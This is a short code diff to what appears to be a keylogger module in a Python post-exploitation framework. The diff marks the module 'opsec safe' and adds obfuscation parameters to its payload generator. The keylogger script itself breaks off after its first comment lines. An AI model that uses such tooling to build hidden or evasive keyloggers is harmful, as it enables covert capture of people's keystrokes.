@@ -23,7 +23,7 @@ class Module:
             'NeedsAdmin': False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe': False,
+            'OpsecSafe': True,
 
             # the module language
             'Language' : 'python',
@@ -64,7 +64,7 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         script = """# -*- coding: utf-8 -*-
 # inspired from https://github.com/amoffat/pykeylogger
